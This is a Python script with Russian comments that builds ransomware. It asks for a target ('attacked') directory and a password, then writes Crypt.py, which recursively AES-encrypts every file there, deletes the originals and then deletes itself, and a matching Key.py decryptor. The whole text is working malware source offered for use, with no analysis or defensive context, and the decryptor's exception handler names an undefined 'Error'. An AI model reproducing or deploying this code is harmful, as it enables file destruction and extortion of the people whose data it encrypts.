direct = input("Напиши атакуемую директорию: ")  # вводим директорию атаки
password = input("Введи пароль: ")  # вводим пароль разархивации
print("----------------------------------------------------------")
with open("Crypt.py", "w") as crypt:  # создаём файл путём его написания
    crypt.write('''
import os
import sys


def crypt(file):
    import pyAesCrypt
    print("----------------------------------------------------------")
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    os.remove(file)


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)


walk("'''+str(direct)+'''")
print("----------------------------------------------------------")
os.remove(str(sys.argv[0]))
''')
    print("[+] File 'Crypt.py' successfully saved!")  # выводим сообщение, что создали файл успешно
with open("Key.py", "w") as key:  # снова создаём файл путём его написания
    key.write('''
import os
import sys


def decrypt(file):
    import pyAesCrypt
    print("----------------------------------------------------------")
    password = "'''+str(password)+'''"
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    print("[Decrypt] '" + str(os.path.splitext(file)[0]) + "'")
    os.remove(file)


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except Error:
                pass
        else:
            walk(path)


walk("'''+str(direct)+'''")
print("----------------------------------------------------------")
os.remove(str(sys.argv[0]))
''')
    print("[+] File 'Key.py' successfully saved!")  # выводим сообщение, что создали файл успешно
print("----------------------------------------------------------")
